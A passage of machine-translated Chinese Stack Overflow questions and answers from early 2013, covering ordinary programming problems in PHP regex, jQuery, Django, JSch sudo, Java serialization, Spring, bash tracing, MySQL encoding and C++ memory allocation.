01-08 22:11:13.717: E/AndroidRuntime(7284): at com.example.restaurent.OpenTicketList.onCreate(OpenTicketList.java:48)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.app.Activity.performCreate(Activity.java:4465)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
01-08 22:11:13.717: E/AndroidRuntime(7284): at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1931)
01-08 22:11:13.717: E/AndroidRuntime(7284): ... 11 more 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:11:46.373

```
Caused by: java.lang.NullPointerException
    at com.example.restaurent.OpenTicketList.initialize(OpenTicketList.java:67) 
```

NullPointerException 意味着您试图从空变量引用方法或成员，在这种情况下`null.setAdapter()`。

这意味着您当前的布局没有 ID 为 ListView `lvOpenTicketList`...

# php - 如何按句点拆分字符串但忽略称呼？

> ID：14220537
> 
> 赞同：1
> 
> 时间：2013-01-08T17:18:26.490
> 
> 标签：php, regex, text-parsing, preg-split

我非常清楚这是一个不平凡的问题。

我目前有这个：

```
(.*?)(!,"\s|!,"$|\.\s|\.$|\!"?\s+?|\!"?$|\?"?\s+?|\?"?$|\."\s+?|\."$|…&quot;\s+?|…&quot;?$) 
```

这是匹配各种行尾位和拆分句子/段落。它做得很好。

但是，鉴于这句话：

```
Hello, Dr. Smith. How are you? 
```

我想把它分成：

1.  `Hello, Dr. Smith.`
2.  `How are you?`

我现有的解决方案会产生类似的东西：

1.  `Hello, Dr.`
2.  `Smith.`
3.  `How are you?`

有一整套（负面）匹配的称呼：

```
Dr.|Prof.|Mr.|Mrs.|Ms. 
```

任何想法如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2021-01-05T04:21:53.860

我怀疑你正在盯着一个兔子洞。如果您选择走这条路，请为一些无法预料的挑战做好准备。

至于您最直接的要求，请列出您的非拆分匹配项，然后使用`(*SKIP)(*FAIL)`丢弃这些匹配项并继续匹配应该触发拆分点的字符串。

`\K`将重置全字符串匹配。这意味着之前匹配的字符不会在爆炸中被删除。制作这些元素时只会消耗空白字符。

代码：（[演示](https://3v4l.org/MIYDl)）

```
$text = <<<TEXT
Dr. Di MacKusa is a doctor.  Do you know her?!?  She live on 1 Doctor Dr. Doctorsville in the U.S.A. Mr. MacKusa married Dr. Di.
TEXT;

var_export(
    preg_split(
        '~(?:Ms|Dr|Mrs?|Prof)\.(*SKIP)(*FAIL)|[?!.]+\K\s+~',
        $text,
        0,
        PREG_SPLIT_NO_EMPTY
    )
); 
```

输出：

```
array (
  0 => 'Dr. Di MacKusa is a doctor.',
  1 => 'Do you know her?!?',
  2 => 'She live on 1 Doctor Dr. Doctorsville in the U.S.A.',
  3 => 'Mr. MacKusa married Dr. Di.',
) 
```

通过更全面的示例文本，我可以改进我的模式。我的模式是一个相当简单的解决方案，我们尚未设计为正确处理引用的文本。

# php - Wordpress Genesis Theme 错误的 MIME 类型

> ID：14220538
> 
> 赞同：0
> 
> 时间：2013-01-08T17:18:28.583
> 
> 标签：php, html, wordpress, themes, mime-types

我基于 Wordpress Genesis Theme 构建了一个子主题。我将它部署在我的测试服务器上并且它工作。但是，当我将它上传到客户的网站时，它就坏了。

问题在于从子主题加载样式表。错误是：

> 资源解释为样式表，但使用 MIME 类型 text/html 传输：“http://buyinginbergen.com/wordpress/wp-content/themes/CustomBergenTheme/style.css/?ver=1.9.0”。

显然该网站是[http://buyinginbergen.com/wordpress/](http://buyinginbergen.com/wordpress/)。我一直无法弄清楚如何指定文件类型，特别是因为我没有 FTP 访问权限，所以我必须在部署之前在其他地方构建。

想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T12:14:36.097

我们有一个类似的问题——服务器发回的 css 文件的 mime 类型是错误的。我们通过添加解决了它：

```
AddType text/css .css 
```

到 wordpress 根文件夹中的 .htaccess 文件。

# jquery - jQuery最近的跨度未定义

> ID：14220539
> 
> 赞同：0
> 
> 时间：2013-01-08T17:18:29.663
> 
> 标签：jquery

我的 jQuery：

```
$(".result").on("click", function(event){
Side;
var Id = $(this).closest('span.bannerid').data('id');
$.ajax({type: 'GET', url: 'someurl/klik?id=' + Id + '&side=' + Side});
}); 
```

HTML 横幅：

```
<div class="result">
<span class="bannerid" data-id="6"></span>
<p style="text-align: center;">
<a href="http://www.sonmeurl" rel="attachment wp-att-42">
<img src="http://www.someimageurl" width="930" height="180">
</a>
</p>
</div> 
```

问题是 ajax 调用的 ID 未定义，它似乎无法找到具有该 ID 的跨度。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:23:29.230

虽然您可以直接使用它`class`：

```
var Id = $('span.bannerid').data('id'); 
```

其他更多的是

```
 var Id = $(this).children('span.bannerid').data('id'); 
```

和

```
var Id = $(this).find('span.bannerid').data('id'); 
```

**注意：** `.closest()`会在父元素中找到`element at the same level`不是子孙。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:20:25.163

.closest() 用于搜索父母或自我。使用 .find() 代替：

```
var Id = $(this).find('span.bannerid').data('id'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:21:44.053

由于它是直接孩子，因此您可以使用`children()`过滤器。这比 using 稍微高效一些`find()`，因为它不会遍历整个节点——只遍历它的直接后代。

```
$(".result").on("click", function(event) {
    Side;
    var Id = $(this).children('span.bannerid').data('id');
    $.ajax({type: 'GET', url: 'someurl/klik?id=' + Id + '&side=' + Side});
}); 
```

# python - 如何在运行时更改 django 中的数据库

> ID：14220543
> 
> 赞同：1
> 
> 时间：2013-01-08T17:18:41.017
> 
> 标签：python, database, django, login

我在我的用户配置文件中有一个字段来定义数据库名称，该用户可以连接。

像这样：

```
class UserProfile(models.Model):
    user = models.OneToOneField(User)
    dbname = models.CharField(u'Database name', max_length=100, null=True, blank=True)

def create_user_profile(sender, instance, created, **kwargs):
    if created:
        UserProfile.objects.create(user=instance)

post_save.connect(create_user_profile, sender=User) 
```

如何设置 - 在运行时 - django 以使用我的 UserProfile 中预先配置的数据库名称？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-08T17:38:51.417

在 Django 中，您可以在 settings.py 文件中定义多个这样的数据库

```
DATABASES = {
    'app_data': {
        'NAME': 'app_data',
        'ENGINE': 'django.db.backends.postgresql_psycopg2',
        'USER': 'postgres_user',
        'PASSWORD': 's3krit'
    },
    'DBNAME_1': {
        'NAME': 'user_data',
        'ENGINE': 'django.db.backends.mysql',
        'USER': 'mysql_user',
        'PASSWORD': 'priv4te'
    }
} 
```

现在考虑 app_data 是您存储所有用户的位置，并且您希望 user=User_1 然后连接到 User_1 的数据库。使用该`using()`功能按名称选择您的数据库连接

```
>>> user = Auth.objects.using('app_data').get(user=user)
>>> print user.database
DBNAME_0
>>>Data = SomeTable.objects.using(user.database).all() 
```

[在此处](https://docs.djangoproject.com/en/dev/topics/db/multi-db/)阅读有关如何在 Django 中使用多个数据库的更多信息

# ruby - resque-retry - '重试尝试' 显示为 'n/a'

> ID：14220547
> 
> 赞同：1
> 
> 时间：2013-01-08T17:18:54.703
> 
> 标签：ruby, resque-retry

我正在使用 resque-retry 重试我的工作。我在 resque-web 界面的“重试”选项卡上看到需要重试的作业。但是，“**重试尝试**”信息始终为“**不适用**”。是否有一个原因？提前致谢！

# sudo - JSCH sudo su 命令“tty”错误

> ID：14220550
> 
> 赞同：11
> 
> 时间：2013-01-08T17:19:08.217
> 
> 标签：sudo, jsch, tty, su

Java - Jsch sudo 命令。

我正在使用 Jsch，我的任务是登录服务器并运行以下命令

```
sudo su - bumboo 
```

使用以下代码我可以成功连接但是当我尝试运行命令时它给了我错误`sudo: sorry, you must have a tty to run sudo`

以下是我的代码

```
public static Channel sudoBamboo(Session session, String sudo_pass) throws Exception {

        ChannelExec channel = (ChannelExec) session.openChannel("exec");
        //SUDO to bamboo user
        String command = "sudo su - bumboo";
        channel.setCommand(command);

        //InputStream in = channel.getInputStream();
        channel.setInputStream(null, true);

        OutputStream out = channel.getOutputStream();
        //channel.setErrStream(System.err);
        channel.setOutputStream(System.out, true);
        channel.setExtOutputStream(System.err, true);
        //Test change
        //channel.setPty(false);
        channel.connect();

        out.write((sudo_pass + "\n").getBytes());
        out.flush();

        return channel;
    } 
```

他们建议使用的 sudo.java 中的 jsch 可用示例

```
// man sudo
      //   -S  The -S (stdin) option causes sudo to read the password from the
      //       standard input instead of the terminal device.
      //   -p  The -p (prompt) option allows you to override the default
      //       password prompt and use a custom one.
      ((ChannelExec)channel).setCommand("sudo -S -p '' "+command); 
```

但是当我运行命令时`"sudo -S -p - su bamboo"`仍然给我同样的错误

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-08T17:22:20.697

它对我有用

```
String command = "sudo su - bumboo";
channel.setPty(true); 
```

# agile - 客户在 Scrum 管理中的角色

> ID：14220552
> 
> 赞同：1
> 
> 时间：2013-01-08T17:19:34.197
> 
> 标签：agile, scrum

我正在为我的软件工程考试复习，常见的问题之一是项目中不同人的角色。我对如何回答产品负责人、scrum master 和团队的角色有足够的信心，但我不确定客户。

我知道他们与产品负责人保持联系，并为他们编写用户故事。进行估算后，客户会对其进行优先排序。客户可以随时更改产品 backlog 上的优先级，但一旦达到 sprint backlog 就无法触及任何东西。在项目结束时，他们在 sprint review 中向他们展示了产品，可以提出建设性的意见等。他们也可以参加 sprint 回顾。此外，他们可以在任何 Scrum 会议上充当鸡。

还有什么我想念的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:22:27.310

客户也可能是产品负责人，或者您有一个产品负责人充当客户或客户的代理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-09T14:14:18.497

您承担了客户的大部分责任。我想说他们不能改变当前 sprint 中正在处理的故事。否则，有可供选择的选项来适应这种变化。

一旦他们提供评论，他们就会作为附加任务添加到用户故事中，并进入下一个 sprint。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-09T21:24:54.763

您能否在这里准确地说一下“客户”的含义。例如：

*   例如，在 XP 中，“客户”是 Scrum 中产品负责人的同义词
*   客户有时被用作产品最终用户的同义词。因此，如果我正在构建一个电子商务系统，那么购买产品的人就是客户。
*   客户有时被用作“客户”的同义词 - 因此要求您构建电子商务系统的人将是客户。
*   利益相关者同上。支付系统费用的人也是如此。

所以 - 哪个客户会大大影响答案;-)

客户不是 Scrum 角色。这不是 Scrum 概念。PO 是负责产品 backlog 的人。引用[Scrum 指南](http://www.scrum.org/Portals/0/Documents/Scrum%20Guides/Scrum_Guide.pdf)：

> 产品负责人是负责管理产品待办事项的唯一人员。[...] 产品负责人是一个人，而不是一个委员会。产品负责人可以在产品待办列表中代表委员会的愿望，但那些想要更改待办事项项目优先级的人必须说服产品负责人。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-03T23:40:03.370

正如阿德里安所说，客户不是 Scrum 的角色。如果客户扮演PO的角色，就叫他PO，没有客户。PO 可以是客户，但它必须履行所有 PO 职责。请记住，PO 是团队的一部分。

客户是利益相关者群体的一部分。团队（包括 PO）就冲刺审查向利益相关者进行非正式演示（或类似演示），以获得对冲刺目标完成的反馈。

# java - 如何序列化第三方不可序列化的最终类（例如 google 的 LatLng 类）？

> ID：14220554
> 
> 赞同：11
> 
> 时间：2013-01-08T17:19:43.603
> 
> 标签：java, serialization

我正在使用来自 v2 Google Play 服务的[Google 的 LatLng 类。](https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/model/LatLng)该特定类是 final 并且没有实现`java.io.Serializable`. 有什么办法可以让那个`LatLng`类实现`Serializable`吗？

```
public class MyDummyClass implements java.io.Serializable {
    private com.google.android.gms.maps.model.LatLng mLocation;

    // ...
} 
```

我不想声明`mLocation` **transient**。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-01-08T17:29:09.120

它不是`Serializable`，但它是`Parcelable`，如果那将是一个选项。如果没有，您可以自己处理序列化：

```
public class MyDummyClass implements java.io.Serialiazable {
    // mark it transient so defaultReadObject()/defaultWriteObject() ignore it
    private transient com.google.android.gms.maps.model.LatLng mLocation;

    // ...

    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
        out.writeDouble(mLocation.latitude);
        out.writeDouble(mLocation.longitude);
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        mLocation = new LatLng(in.readDouble(), in.readDouble());
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:35:36.193

你可以看看[`ObjectOutputStream`](http://docs.oracle.com/javase/6/docs/api/java/io/ObjectOutputStream.html)。

首先，您必须为您的对象创建一个替代品：

```
 public class SerializableLatLng implements Serializable {

    //use whatever you need from LatLng

    public SerializableLatLng(LatLng latLng) {
        //construct your object from base class
    }   

    //this is where the translation happens
    private Object readResolve() throws ObjectStreamException {
        return new LatLng(...);
    }

} 
```

然后创建一个合适的`ObjectOutputSTream`

```
public class SerializableLatLngOutputStream extends ObjectOutputStream {

    public SerializableLatLngOutputStream(OutputStream out) throws IOException {
        super(out);
        enableReplaceObject(true);
    }

    protected SerializableLatLngOutputStream() throws IOException, SecurityException {
        super();
        enableReplaceObject(true);
    }

    @Override
    protected Object replaceObject(Object obj) throws IOException {
        if (obj instanceof LatLng) {
            return new SerializableLatLng((LatLng) obj);
        } else return super.replaceObject(obj);
    }

} 
```

然后你必须在序列化时使用这些流

```
private static byte[] serialize(Object o) throws Exception {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new SerializableLatLngOutputStream(baos); 
    oos.writeObject(o);
    oos.flush();
    oos.close();
    return baos.toByteArray();
} 
```

# jquery - 谷歌地图时区 API 不适用于 IE

> ID：14220555
> 
> 赞同：0
> 
> 时间：2013-01-08T17:19:49.020
> 
> 标签：jquery, ajax, internet-explorer, google-maps

我正在尝试使用纬度和经度（按照 api 中的要求）获取某个位置的时区。它正在使用 FF 和 chrome，但它在 IE(7,8,9) 中引发错误

```
var url = "https://maps.googleapis.com/maps/api/timezone/json?location=43.653226,-79.38318429999998&timestamp=1331161200&sensor=true";

alert(url);

$.ajax({
        type: "GET",
        url: url,
        cache:false,
        success: function(results){
            alert(results); 
        },
        error:function(xhr, ajaxOptions, thrownError)
        {
            alert(thrownError);
        },
        fail: function(){
            alert('ajax fail');
        }
    }); 
```

错误显示“无传输”

任何建议表示赞赏。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T19:14:50.990

jQuery 目前不支持 InternetExplorer 的 XDR 对象，您需要一个类似[**jquery.xdomain.js的插件**](https://gist.github.com/1114981)

但是还有一个问题：timezone-API 需要 HTTPS-protocoll ，当请求 API 的文档不使用 HTTPS 时，它在 IE 中仍然会失败。

但是您可以使用从 timezone-API 获取结果并将其传递给 jQuery 的服务器端代理脚本

# spring - Spring 3 MVC 多视图解析器（Jsp 和 Velocity）

> ID：14220556
> 
> 赞同：0
> 
> 时间：2013-01-08T17:19:51.400
> 
> 标签：spring, model-view-controller

由于一些业务/技术限制，我们应该使用 spring3 MVC 多视图解析器（**JSP 和 Velocity**）。我试图在网上搜索，但我找不到完美的解决方案。可能其他人也经历过同样的场景。那么您能否让我知道是否可以在 SPring3 MVC 应用程序中**同时使用 JSP 和 Velocity 作为 vew 解析器**

感谢所有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T20:07:52.100

Spring 支持多个视图解析器。您可以通过将多个解析器添加到应用程序上下文并使用 order 属性指定排序来链接视图解析器。

你可以使用链接这些jsp和速度，比如 -

```
 <bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
      <property name="viewClass" value="org.springframework.web.servlet.view.JstlView"/>
      <property name="prefix" value="/WEB-INF/jsp/"/>
      <property name="suffix" value=".jsp"/>
      <property name="order" value="2" />
    </bean>

<bean id="velocityConfig" class="org.springframework.web.servlet.view.velocity.VelocityConfigurer">
  <property name="resourceLoaderPath" value="/WEB-INF/velocity/"/>
</bean>

<bean id="viewResolver" class="org.springframework.web.servlet.view.velocity.VelocityViewResolver">
  <property name="cache" value="true"/>
  <property name="prefix" value=""/>
  <property name="suffix" value=".vm"/>
  <property name="order" value="1" />
</bean> 
```

[在此处](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/mvc.html#mvc-viewresolver-chaining)了解有关视图链接的更多信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:56:27.880

是的，可以配置多个视图解析器，只需确保您订购的 Velocity 比基于 JSP 的视图解析器高一个：

```
<bean id="viewResolver" class="org.springframework.web.servlet.view.velocity.VelocityViewResolver" p:order="0">
  ...
</bean

<bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver" p:order="1">
  <property name="viewClass" value="org.springframework.web.servlet.view.JstlView"/>
  <property name="prefix" value="/WEB-INF/jsp/"/>
  <property name="suffix" value=".jsp"/>
</bean> 
```

# python - 我可以用python中几个正则表达式的并集来扩展单个字符串吗？

> ID：14220557
> 
> 赞同：0
> 
> 时间：2013-01-08T17:20:02.333
> 
> 标签：python, regex

我正在破解一个转换文件类型的[包](http://code.google.com/p/ruffus/)，允许用户指定转换（python 函数）和用于更改文件名的正则表达式。

在一种情况下，我有一系列正则表达式和一个输出字符串，我希望通过我所有的正则表达式组的联合来扩展它们：

```
import re
re_strings = ['(.*).txt', '(.*).ogg', 'another(?P<name>.*)']
regexes = map(re.compile, re_strings]
input_files = ['cats.txt', 'music.ogg', 'anotherpilgrim.xls']
matches = [regexes[i].match(input_files[i]) for i in range(len(regexes))]

outputstr = 'Text file about: \1, audio file about: \2, and another file on \g<name>.'
# should be 'Text file about: cats, audio file about: music, and another file on pilgrim.xls' 
```

我想`outputstr`用正则表达式的联合进行扩展（也许连接对`\2`参考更有意义？）。我可以连接 re，用一些未使用的字符分隔它们：

```
final_re = re.compile('\n'.join(re_strings))
final_files = '\n'.join(input_files)
match = final_re.search(final_files) 
```

但这会强制 re 匹配整个文件，而不仅仅是文件名的某些部分。我可以在文件之间放入一个包罗万象的组，`(.*?)`但这肯定会弄乱组引用，并且可能会弄乱原始模式（我无法控制）。我想我也可以在任何地方强制命名组，然后合并所有正则表达式 .groupdict()s ...

Python 不允许部分扩展，因此所有组引用都必须有效，因此无论如何都没有机会为 groupdict 进行一系列扩展，例如：

```
for m in matches:
    outputstr = m.expand(outputstr) 
```

感谢您的任何建议！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T11:46:09.687

只是为了记录，这里是如何组合几个正则表达式结果的结果，并在它们之间进行替换。

给定几个查询字符串和几个正则表达式匹配：

```
import re

query_str = ["abcdyyy", "hijkzzz"]
re_pattern = [r"(a)(b)(?P<first_name>c)(d)",
              r"(h)(i)(?P<second_name>j)(k)"]

# match each separately
matches= [re.search(p,q) for p,q in 
          zip(re_pattern, query_str)] 
```

我们想创建一个结合所有搜索结果的替换字符串：

```
replacement = r"[\4_\g<first_name>_\2_\1:\5:\6:\8:\g<second_name>]" 
```

为此，我们需要：

1.  合并搜索结果
2.  有一个代理代替合并的结果（match_substitute）
3.  有一个代理对象来处理命名组，例如“first_name”（pattern_substitute）

这由以下代码处理。结果在“结果”中：

```
import sre_parse

#
#   dummy object to provide group() function and "string" member variable
#
class match_substitute:
    def __init__(self, matches): 
        self.data = []
        for m in matches:
            self.data.extend(m.groups())
        self.string = ""
    # regular expression groups count from 1 not from zero!
    def group(self, ii):
        return self.data[ii - 1]

#
#   dummy object to provide groupindex dictionary for named groups
#
class pattern_substitute:
    def __init__(self, matches, re_pattern): 
        #
        #   Named group support
        #   Increment indices so they are point to the correct position
        #       in the merged list of matching groups
        #
        self.groupindex = dict()
        offset = 0
        for p, m in zip(re_pattern, matches):
            for k,v in sre_parse.parse(p).pattern.groupdict.iteritems():
                self.groupindex[k] = v + offset
            offset += len(m.groups())

match   = match_substitute(matches)
pattern = pattern_substitute(matches, re_pattern)

#
#   parse and substitute
#
template = sre_parse.parse_template(replacement, pattern)
result = sre_parse.expand_template(template, match) 
```

# html - ipad没有触摸手势但仍然可以点击

> ID：14220561
> 
> 赞同：-2
> 
> 时间：2013-01-08T17:20:20.560
> 
> 标签：html, ios, css, ipad

我有一个带有可点击按钮的 ipad 网页。

但有时人们无法点击，因为他们拖动手指会使页面“滚动”。

我的页面是屏幕的大小，所以我不需要滚动。有没有办法通过 html/css 消除网页上的滚动/移动？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:53:50.793

如果你想禁用滚动，你可以简单地使用下面的 jQuery 代码：

```
$(window).bind('touchmove', function(e) { e.preventDefault() }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-09T13:39:36.493

最终使用 .js

```
<script type="text/javascript">
document.addEventListener(
'touchmove',
function(e) {
e.preventDefault();
},
false
);
</script> 
```

# bash - 为什么 bash 会插入我没有要求的引号？

> ID：14220567
> 
> 赞同：7
> 
> 时间：2013-01-08T17:20:30.827
> 
> 标签：bash, shell

有人可以向我解释一下吗？

```
$ set -x
$ export X="--vendor Bleep\ Bloop"; echo $X
+ export 'X=--vendor Bleep\ Bloop'
+ X='--vendor Bleep\ Bloop'
+ echo --vendor 'Bleep\' Bloop
--vendor Bleep\ Bloop
$ 
```

具体来说，为什么该`echo`行会插入`'`我没有要求的字符，为什么它会使字符串看起来未终止？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T18:00:09.430

### 了解外壳扩展

Bash 以固定的顺序执行[shell 扩展](http://www.gnu.org/software/bash/manual/bashref.html#Shell-Expansions)。-x 标志允许您查看 Bash 在标记和扩展组成输入行的单词时所采取的步骤的中间结果。

换句话说，输出按设计运行。除非您尝试调试标记化、分词或扩展，否则中间结果对您来说并不重要。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:25:26.027

（好问题）

' 字符实际上并不存在。

我将描述您所看到的功能，因为这些`-x`功能试图消除它是如何处理保持您的字符串完好无损的。`+`单独一行前面的符号`echo`显示这是 shell 调试/跟踪输出。

请注意，最终输出与您的作业完全相同，即`X=...`

IHTH

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-08T17:35:29.547

你的困惑似乎更多地来自于此`+ echo --vendor 'Bleep\' Bloop`。它看起来像这样的原因是因为它正在打印展开时的样子`X`。换句话说，做`$X`评估是将独立的“单词” `--vendor`, `Bleep\`, 和`Bloop`放在命令行上。但是，这意味着 that`Bloop\`是一个单词，并且为了防止`\`被解释为转义`（空格），它保留了`\`. 如果这些是不同命令的参数，我建议您执行以下任一操作：`

 ````
export X='--vendor "Bleep Bloop"' 
```

或者

```
export X="--vendor \"Bleep Bloop\"" 
```

但我 100% 不确定这两种方法是否有效。如果要将参数存储到命令中，可以执行以下操作：

```
# optional:
# declare -a ARGS
ARGS=('--vendor' '"Bleep Bloop"') 
```

然后将它们用作：

```
echo ${ARGS[@]} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-08T17:53:56.723

这段代码

```
echo --vendor 'Bleep\' Bloop 
```

产生完全相同的输出

```
echo "--vendor Bleep\ Bloop" 
```

Bash 只是通过调试/跟踪选项将您的代码重新解释为它自己的代码。造成这种情况的原因可能是历史性的，不应在意。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-08T17:23:08.960

当你`set -x`告诉 Bash 打印它对你输入的每个命令的解释时。

所以当你投入

```
export X="--vendor Bleep\ Bloop" 
```

Bash 将其视为

```
export 'X=--vendor Bleep\ Bloop' 
```

和这样的打印。`

# php - 从 mysql 数据库中提取的字符编码问题

> ID：14220571
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:20:44.027
> 
> 标签：php, mysql, character-encoding

> **可能重复：**
> [一直到 UTF-8](https://stackoverflow.com/questions/279170/utf-8-all-the-way-through)

好吧，这很愚蠢，我无法弄清楚。

Mysql 数据库设置为 utf8_general_ci 排序规则。我遇到问题的字段是长文本类型。

添加到数据库的`&eacute`字符或其他重音字符返回为 �。

我运行输出`stripslashes`，我尝试了有和没有，`html_entity_decode`但在输出中找不到任何变化。我究竟做错了什么？

干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:26:59.910

您尝试插入的字符串具有什么字符编码？如果它在 ISO-8859-1 中，您可以使用 PHP 函数 utf8_encode() 将其编码为 UTF-8，然后再将其插入数据库。

[http://php.net/manual/en/function.utf8-encode.php](http://php.net/manual/en/function.utf8-encode.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-09T02:15:13.193

正确编码真的很棘手 - 层太多：

*   浏览器
*   页
*   PHP
*   MySQL

PHP 的 SQL 命令“SET CHARSET utf8”将确保客户端 (PHP) 以 utf8 格式获取数据，无论它们如何存储在数据库中。当然，首先需要正确存储它们。

## DDL 定义与真实数据

为表/列定义的编码并不真正意味着数据采用该编码。如果您碰巧有一个表定义为`utf8`但存储为不同的编码，那么 MySQL 会将它们视为`utf8`并且您遇到了麻烦。这意味着你必须先解决这个问题。

## 检查什么

您需要检查每一层数据流的编码方式。

*   检查 HTTP 标头，标头。
*   检查请求正文中真正发送的内容。
*   不要忘记 MySQL 几乎到处都有编码：
    *   数据库
    *   表
    *   列
    *   服务器作为一个整体
    *   客户
        确保到处都有合适的人。

## 转换

如果您在 eg 中接收数据`windows-1250`，并希望存储在 中`utf-8`，则在存储之前使用此 SQL：

```
SET NAMES 'cp1250'; 
```

如果您在 DB 中有数据`windows-1250`并且想要检索`utf8`，请使用：

```
SET CHARSET 'utf8'; 
```

## 最后一点：

不要依赖过于“智能”的工具来显示数据。例如，phpMyAdmin 确实（在我使用它时正在做）编码真的很糟糕。它贯穿所有层，所以很难找出来。此外，Internet Explorer 有非常愚蠢的行为，即根据奇怪的规则“猜测”编码。使用可以切换编码的简单编辑器。另外，我推荐 MySQL Workbench。

# c++ - 快速了解 new/delete 和 alloc/free

> ID：14220573
> 
> 赞同：3
> 
> 时间：2013-01-08T17:20:56.703
> 
> 标签：c++

与 alloc/free 相比，我对 new/delete 运算符有疑问。

当为 char* 动态分配内存时，我通常使用 calloc，因此所有保留位都设置为零，因此我不必为 null 终止而烦恼。

char *string = new char[20] 是否仅保留 20 个具有 char 大小的项目，或者它是否还将该内存区域中的所有位设置为零？

如果不能，可以在此内存上使用 memset 来实现吗？如果 memset 或任何其他将分配的内存清零的方法是可能的，是否可以为本地 char 类型重载 new 运算符以自行完成这项工作？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-08T17:26:52.867

当您使用：

```
string = new char[20]; 
```

分配的数组未初始化。为了默认初始化它，您必须使用：

```
string = new char[20]();  // Allocates and initializes all members to 0 
```

这在 C++03 §5.3.4/15 中有说明：

> 创建 T 类型对象的 new 表达式按如下方式初始化该对象： ...
> 
> 如果 new-initializer 为 () 形式，则该项为值初始化 (8.5)；

至于你的第二个问题——是的，你可以用`memset`你想要的任何值来填充内存。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:23:40.527

`char * string = new char[20]`将在分配内存之前填充已分配内存中的任何内容。

您可以将数组 memset 为 0 以实现您想要的。

```
char * string = new char[20];
memset(string, 0x00, sizeof(char) * 20); 
```

覆盖 new 也可以做到这一点。

```
void* operator new(size_t n){
   void * mem = malloc(n);
   memset(mem, 0x00, n);
   return mem;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-08T17:23:57.027

`new`不对原始类型（如`char`）进行零初始化。使用`memset`很好，但惯用的 C++ 方法是使用`std::fill`：

```
std::fill(string, string+length, 0); 
```

当然，如果你想要一个字符串，那么你应该只`std::string`在 C++ 中使用 a 。

# emacs - mmm-mode：将 C++ 模式实现为子模式

> ID：14220577
> 
> 赞同：0
> 
> 时间：2013-01-08T17:21:12.417
> 
> 标签：emacs, elisp

我们使用一种内部脚本语言（我们称之为`pkc`），它允许嵌入 C++ 代码。C++ 代码段由`{{{`和`}}}`标记分隔。

[我使用Generic Mode](http://www.emacswiki.org/emacs/GenericMode)和[mmm-mode](http://www.emacswiki.org/emacs/MmmMode)为这种语言创建了一个 emacs模式。

这是我得到的（剥离了在这里发布的非必要部分）：

```
(require 'generic-x)

(setq pkc-imenu-generic-expression
      '(("macros" "^[ \t]*macro[ \n\t]+\\([a-zA-Z0-9_]+\\)" 1)
        ("functions" "function[ \n\t]+\\([a-zA-Z0-9_]+\\)" 1)
        ))

(require 'cc-mode)      ;; for c++-mode
(require 'mmm-auto)
(setq mmm-global-mode 'maybe)

(define-generic-mode
  'pkc-mode                                  ;; name of the mode to create
  '("//" ("/*" . "*/"))                      ;; comments are same C++ comments
  '( ... )                                   ;; some keywords
  '("\\.pkc$")                               ;; files for which to activate this mode

  ;; other functions to call
  '((lambda ()
      (mmm-mode 1)
      (setq mmm-submode-decoration-level 2)
      (setq imenu-generic-expression pkc-imenu-generic-expression)
      (which-function-mode 1)

      (c-initialize-cc-mode t)
      (c-init-language-vars-for 'c++-mode)
      (c-common-init 'c++-mode)
      (c-update-modeline)

      (message "pkc-mode[mmm] is on")))

  "A mode for pkc source files"                  ;; doc string for this mode
  )

(mmm-add-classes
 '((embedded-c++
    :submode c++-mode
    :face mmm-default-submode-face
    :front "{{{"
    :front-offset -1
    :back "}}}"
    :back-offset 1)))

(mmm-add-mode-ext-class 'pkc-mode nil 'embedded-c++) 
```

当我加载带有嵌入式 C++ 代码段的源文件时，它们的突出显示比 C++ 模式是主要模式时的突出显示要少（但这不是我的问题）。当光标在 C++ 代码中时，模式行变为`pkc/l[C++/l]`（如预期的那样）。

